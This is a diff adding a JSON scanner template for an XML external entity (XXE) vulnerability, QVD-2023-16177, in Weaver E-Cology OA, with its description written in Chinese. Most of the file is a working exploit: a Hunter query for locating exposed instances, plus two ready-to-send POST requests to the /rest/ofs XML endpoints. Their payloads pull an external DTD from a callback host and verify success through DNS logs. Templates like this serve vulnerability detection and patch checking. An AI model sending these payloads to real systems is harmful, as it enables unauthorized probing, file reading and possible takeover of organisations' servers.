@@ -1,0 +1,64 @@
+{
+  "product": "泛微 E-Cology",
+  "vul_name": "泛微 E-Cology ReceiveCCRequestByXml外部实体注入",
+  "type": "外部实体注入",
+  "vul_id": [
+    "QVD-2023-16177"
+  ],
+  "level": 3,
+  "vul_desc": "泛微e-cology某处功能点最初针对用户输入的过滤不太完善，导致在处理用户输入时可触发XXE。后续修复规则依旧可被绕过，本次漏洞即为之前修复规则的绕过。攻击者可利用该漏洞列目录、读取文件，甚至可能获取应用系统的管理员权限。",
+  "version": "泛微 EC 9.x 且补丁版本 < 10.58.2、泛微 EC 8.x 且补丁版本 < 10.58.2",
+  "note": "",
+  "search": {
+    "Hunter": "app.name=\"泛微 e-cology 9.0 OA\""
+  },
+  "protocol": "http",
+  "link": "https://www.cnblogs.com/pursue-security/p/17677321.html",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "model": "dnslog",
+  "logic": "or",
+  "exploit": [
+    {
+      "exp": {
+        "method": "post",
+        "follow": false,
+        "path": "/rest/ofs/ReceiveCCRequestByXml",
+        "header": {
+          "Content-Type": "application/xml"
+        },
+        "data": "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE syscode SYSTEM \"http://{{m:rep}}\"><M><syscode>&send;</syscode></M>"
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "model": "dnslog"
+          }
+        ]
+      }
+    },
+    {
+      "exp": {
+        "method": "post",
+        "follow": false,
+        "path": "/rest/ofs/deleteUserRequestInfoByXml",
+        "header": {
+          "Content-Type": "application/xml"
+        },
+        "data": "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE syscode SYSTEM \"http://{{m:rep}}\"><M><syscode>&send;</syscode></M>"
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "model": "dnslog"
+          }
+        ]
+      }
+    }
+  ]
+}
